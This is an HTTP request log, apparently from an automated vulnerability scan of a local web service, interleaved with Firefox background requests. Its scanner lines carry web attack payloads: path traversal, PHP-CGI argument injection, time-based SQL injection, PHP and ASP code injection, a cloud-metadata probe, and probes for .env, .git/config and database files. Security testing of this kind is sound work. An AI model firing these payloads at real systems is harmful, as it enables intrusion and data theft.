+398,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/test.php,404,Not Found,10,426,21
+399,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/.hg,404,Not Found,52,428,16
+400,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/.bzr,404,Not Found,6,428,17
+401,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/._darcs,404,Not Found,92,429,20
+402,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/BitKeeper,404,Not Found,147,427,22
+403,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:20 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/4342213316484000486,200,OK,278,229,84
+404,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,316,229,84
+405,Mon Mar 20 21:52:20 CET 2023,Mon Mar 20 21:52:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/7508334885752352578,200,OK,324,229,84
+407,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,194,229,84
+408,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/2471231757395544868,200,OK,272,229,84
+409,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,246,229,84
+410,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini/4626148186993195839,200,OK,223,229,84
+412,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:21 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,182,229,84
+413,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/8180840957550825964,200,OK,285,229,84
+414,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,245,229,84
+415,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,252,229,84
+416,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/1986707262499324508,200,OK,257,229,84
+418,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:22 CET 2023,POST,https://shavar.services.mozilla.com/downloads?client=navclient-auto-ffox&appver=111.0&pver=2.2,200,OK,1203,201,1497
+419,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,205,229,84
+420,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/web.xml,404,Not Found,54,433,28
+421,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/applicationContext.xml,404,Not Found,52,428,43
+422,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/classes/web/xml.class,404,Not Found,12,428,42
+423,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/classes/applicationContext/xml.class,404,Not Found,12,432,57
+424,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,190,229,84
+425,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers/param1?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,34,434,110
+426,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:22 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers/param1?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,51,431,110
+427,Mon Mar 20 21:52:22 CET 2023,Mon Mar 20 21:52:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,208,229,84
+428,Mon Mar 20 21:52:23 CET 2023,Mon Mar 20 21:52:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,160,229,84
+429,Mon Mar 20 21:52:23 CET 2023,Mon Mar 20 21:52:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,176,229,84
+430,Mon Mar 20 21:52:21 CET 2023,Mon Mar 20 21:52:23 CET 2023,POST,https://shavar.services.mozilla.com/downloads?client=navclient-auto-ffox&appver=111.0&pver=2.2,200,OK,1494,201,1497
+431,Mon Mar 20 21:52:23 CET 2023,Mon Mar 20 21:52:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,283,229,84
+432,Mon Mar 20 21:52:23 CET 2023,Mon Mar 20 21:52:23 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/c:%252FWindows%252Fsystem.ini,200,OK,306,229,84
+433,Mon Mar 20 21:52:23 CET 2023,Mon Mar 20 21:52:23 CET 2023,GET,https://firefox.settings.services.mozilla.com/v1/buckets/monitor/collections/changes/changeset?collection=query-stripping&bucket=main&_expected=0,200,OK,717,521,223
+434,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,https://firefox.settings.services.mozilla.com/v1/buckets/main/collections/query-stripping/changeset?_expected=1678736907773,200,OK,23,523,1854
+435,Mon Mar 20 21:52:23 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,189,229,84
+436,Mon Mar 20 21:52:23 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,200,OK,260,229,84
+437,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,https://firefox.settings.services.mozilla.com/v1/buckets/monitor/collections/changes/changeset?collection=query-stripping&bucket=main&_expected=0,200,OK,222,521,223
+438,Mon Mar 20 21:52:23 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/ads-track-digest256/1668785275,200,OK,326,474,56086
+439,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/8587773559247258086,200,OK,164,229,84
+440,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,http://172.18.0.4:30001/favicon.ico,404,Not Found,26,431,24
+441,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,http://172.18.0.4:30001/favicon.ico,404,Not Found,56,431,24
+442,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/ads-track-digest256/1668785275,200,OK,605,506,56086
+443,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1/7766499857783186065,200,OK,224,229,84
+445,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:24 CET 2023,GET,https://firefox.settings.services.mozilla.com/v1/buckets/main/collections/query-stripping/changeset?_expected=1678736907773,200,OK,101,523,1854
+446,Mon Mar 20 21:52:24 CET 2023,Mon Mar 20 21:52:25 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,249,229,84
+447,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:25 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,331,229,84
+448,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:25 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-track-digest256/1668785275,200,OK,146,502,2165
+449,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:25 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-track-digest256/1668785275,200,OK,159,485,2165
+450,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:25 CET 2023,GET,https://content-signature-2.cdn.mozilla.net/chains/remote-settings.content-signature.mozilla.org-2023-04-30-16-53-14.chain,200,OK,157,516,5348
+451,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:25 CET 2023,GET,https://content-signature-2.cdn.mozilla.net/chains/remote-settings.content-signature.mozilla.org-2023-04-30-16-53-14.chain,200,OK,33,516,5348
+452,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:25 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/analytics-track-digest256/1663274228,200,OK,127,473,10230
+453,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:26 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/analytics-track-digest256/1663274228,200,OK,98,473,10230
+454,Mon Mar 20 21:52:26 CET 2023,Mon Mar 20 21:52:26 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/content-track-digest256/1670952926,200,OK,77,474,15414
+455,Mon Mar 20 21:52:26 CET 2023,Mon Mar 20 21:52:26 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/content-track-digest256/1670952926,200,OK,75,474,15414
+456,Mon Mar 20 21:52:26 CET 2023,Mon Mar 20 21:52:26 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/mozstd-trackwhite-digest256/1670952926,200,OK,318,487,337079
+457,Mon Mar 20 21:52:26 CET 2023,Mon Mar 20 21:52:26 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/mozstd-trackwhite-digest256/1670952926,200,OK,300,487,337079
+458,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:27 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,1945,230,84
+459,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:27 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers?name=abc,200,OK,1904,230,84
+460,Mon Mar 20 21:52:25 CET 2023,Mon Mar 20 21:52:27 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue?name=abc,200,OK,1983,230,84
+461,Mon Mar 20 21:52:27 CET 2023,Mon Mar 20 21:52:29 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/web.xml,404,Not Found,1600,428,28
+462,Mon Mar 20 21:52:28 CET 2023,Mon Mar 20 21:52:29 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/google-trackwhite-digest256/1604686195,200,OK,1160,496,1470328
+463,Mon Mar 20 21:52:29 CET 2023,Mon Mar 20 21:52:29 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/applicationContext.xml,404,Not Found,528,430,43
+464,Mon Mar 20 21:52:29 CET 2023,Mon Mar 20 21:52:29 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/classes/web/xml.class,404,Not Found,40,429,42
+465,Mon Mar 20 21:52:29 CET 2023,Mon Mar 20 21:52:29 CET 2023,GET,http://172.18.0.4:30001/WEB-INF/classes/applicationContext/xml.class,404,Not Found,12,428,57
+466,Mon Mar 20 21:52:30 CET 2023,Mon Mar 20 21:52:30 CET 2023,GET,http://172.18.0.4:30001/favicon.ico,404,Not Found,277,309,24
+467,Mon Mar 20 21:52:30 CET 2023,Mon Mar 20 21:52:30 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/google-trackwhite-digest256/1604686195,200,OK,506,496,1470328
+468,Mon Mar 20 21:52:27 CET 2023,Mon Mar 20 21:52:30 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,3223,230,84
+469,Mon Mar 20 21:52:32 CET 2023,Mon Mar 20 21:52:32 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-fingerprinting-track-digest256/1663274228,200,OK,107,473,3605
+470,Mon Mar 20 21:52:32 CET 2023,Mon Mar 20 21:52:32 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-cryptomining-track-digest256/1604686195,200,OK,153,485,2261
+471,Mon Mar 20 21:52:33 CET 2023,Mon Mar 20 21:52:33 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-facebook-digest256/1604686195,200,OK,464,471,436
+472,Mon Mar 20 21:52:33 CET 2023,Mon Mar 20 21:52:33 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-fingerprinting-track-digest256/1663274228,200,OK,303,473,3605
+473,Mon Mar 20 21:52:34 CET 2023,Mon Mar 20 21:52:34 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-cryptomining-track-digest256/1604686195,200,OK,257,485,2261
+474,Mon Mar 20 21:52:33 CET 2023,Mon Mar 20 21:52:34 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-linkedin-digest256/1564526481,200,OK,372,472,115
+475,Mon Mar 20 21:52:33 CET 2023,Mon Mar 20 21:52:34 CET 2023,GET,http://172.18.0.4:30001/favicon.ico,404,Not Found,828,309,24
+476,Mon Mar 20 21:52:34 CET 2023,Mon Mar 20 21:52:34 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-twitter-digest256/1604686195,200,OK,275,472,212
+477,Mon Mar 20 21:52:34 CET 2023,Mon Mar 20 21:52:35 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-facebook-digest256/1604686195,200,OK,520,483,436
+478,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:36 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-email-track-digest256/1668785275,200,OK,137,473,6933
+479,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:36 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-linkedin-digest256/1564526481,200,OK,164,501,115
+480,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:36 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-tracking-protection-twitter-digest256/1604686195,200,OK,103,472,212
+481,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:36 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/content-email-track-digest256/1668785275,200,OK,103,473,8821
+482,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:36 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/base-email-track-digest256/1668785275,200,OK,133,505,6933
+483,Mon Mar 20 21:52:36 CET 2023,Mon Mar 20 21:52:37 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/content-email-track-digest256/1668785275,200,OK,100,473,8821
+484,Mon Mar 20 21:52:30 CET 2023,Mon Mar 20 21:52:37 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,7109,230,84
+485,Mon Mar 20 21:52:37 CET 2023,Mon Mar 20 21:52:40 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,2239,230,84
+486,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers/param1?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,68,432,110
+487,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,POST,http://172.18.0.4:30001/catalogue/catalogue/customers/param1?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,404,Not Found,50,437,110
+488,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,298,229,84
+489,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,170,229,84
+490,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,156,229,84
+491,Mon Mar 20 21:52:40 CET 2023,Mon Mar 20 21:52:40 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,178,229,84
+492,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:41 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,476,229,84
+493,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:41 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,471,229,84
+494,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:41 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,251,229,84
+495,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:41 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,359,229,84
+496,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,518,229,84
+497,Mon Mar 20 21:52:41 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,494,229,84
+498,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,369,229,84
+499,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,319,229,84
+500,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,52,327,51
+501,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,6,326,51
+502,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,9,326,51
+503,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/latest/meta-data/,301,Moved Permanently,12,326,51
+504,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:42 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,218,229,84
+505,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,283,229,84
+506,Mon Mar 20 21:52:42 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,320,229,84
+507,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,200,OK,417,229,84
+508,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/,200,OK,5,229,84
+509,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,200,OK,257,229,84
+510,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,418,229,84
+511,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:43 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,348,229,84
+512,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,252,229,84
+513,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,313,229,84
+514,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,242,229,84
+515,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,144,228,84
+516,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,191,229,84
+517,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,184,229,84
+518,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,210,229,84
+519,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,168,229,84
+520,Mon Mar 20 21:52:43 CET 2023,Mon Mar 20 21:52:44 CET 2023,POST,https://shavar.services.mozilla.com/downloads?client=navclient-auto-ffox&appver=111.0&pver=2.2,200,OK,1161,201,1497
+521,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,231,229,84
+522,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,319,229,84
+523,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,200,OK,240,229,84
+524,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:44 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,357,229,84
+525,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,422,229,84
+526,Mon Mar 20 21:52:44 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers,200,OK,317,229,84
+527,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/elmah.axd,404,Not Found,143,436,22
+528,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,172,229,84
+529,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/customers/param1,200,OK,375,229,84
+530,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/ads-track-digest256/1668785275,200,OK,453,474,56086
+531,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22,200,OK,398,229,84
+532,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/trace.axd,200,OK,226,229,84
+533,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27,200,OK,165,229,84
+534,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/social-track-digest256/1668785275,200,OK,216,502,2165
+535,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,https://firefox.settings.services.mozilla.com/v1/buckets/monitor/collections/changes/changeset?collection=query-stripping&bucket=main&_expected=0,200,OK,23,521,223
+536,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,243,229,84
+537,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:45 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D,200,OK,179,229,84
+538,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,http://172.18.0.4:30001/catalogue/.htaccess,200,OK,229,229,84
+540,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C,200,OK,145,229,84
+541,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,https://firefox.settings.services.mozilla.com/v1/buckets/main/collections/query-stripping/changeset?_expected=1678736907773,200,OK,168,523,1854
+542,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B,200,OK,157,229,84
+543,Mon Mar 20 21:52:45 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/analytics-track-digest256/1663274228,200,OK,496,473,10230
+544,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%22%2Bresponse.write%28%5B515.786*69.172%29%2B%22,200,OK,190,229,84
+545,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,https://content-signature-2.cdn.mozilla.net/chains/remote-settings.content-signature.mozilla.org-2023-04-30-16-53-14.chain,200,OK,108,516,5348
+546,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,232,229,84
+547,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B,200,OK,242,229,84
+548,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:46 CET 2023,GET,http://172.18.0.4:30001/catalogue/.env,200,OK,285,229,84
+549,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue/response.write%28515.786*69.172%29,200,OK,410,229,84
+550,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,https://tracking-protection.cdn.mozilla.net/content-track-digest256/1670952926,200,OK,350,474,15414
+551,Mon Mar 20 21:52:46 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/catalogue/catalogue,200,OK,392,229,84
+552,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/lfm.php,404,Not Found,43,431,20
+553,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/.idea/WebServers.xml,404,Not Found,8,428,33
+554,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/config/databases.yml,404,Not Found,17,426,33
+555,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/config/database.yml,404,Not Found,52,430,32
+556,Mon Mar 20 21:52:47 CET 2023,Mon Mar 20 21:52:47 CET 2023,GET,http://172.18.0.4:30001/.git/config,404,Not Found,28,435,24
